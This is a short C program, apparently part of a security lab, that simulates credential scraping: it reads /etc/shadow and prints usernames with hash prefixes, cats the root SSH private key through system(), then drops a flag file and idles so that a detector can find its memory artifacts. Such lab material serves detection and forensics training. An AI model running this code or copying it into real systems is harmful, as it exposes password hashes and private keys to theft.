#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include "lab_common.h"

int run_cred_scrape_v2(void) {
    printf("[*] Credential Scrape v2\n");
    
    // Method 1: Read shadow directly (works as root)
    printf("[*] Reading /etc/shadow...\n");
    FILE *f = fopen("/etc/shadow", "r");
    if (f) {
        char line[256];
        int count = 0;
        while (fgets(line, sizeof(line), f) && count < 5) {
            char *user = strtok(line, ":");
            char *hash = strtok(NULL, ":");
            if (user && hash) {
                printf("[+] User: %s, Hash prefix: %.10s...\n", user, hash);
            }
            count++;
        }
        fclose(f);
        printf("[*] Shadow read OK\n");
    }
    
    // Method 2: Check for SSH keys
    printf("[*] Checking SSH keys...\n");
    system("cat /root/.ssh/id_rsa 2>/dev/null | head -3 || echo '[-] No root SSH keys'");
    
    // Keep alive for memory artifact
    printf("[+] Cred scrape alive, PID: %d\n", getpid());
    set_flag("/tmp/.cred_scrape_v2_active");
    
    for (;;) pause();
    return 0;
}

int main(void) {
    return run_cred_scrape_v2();
}
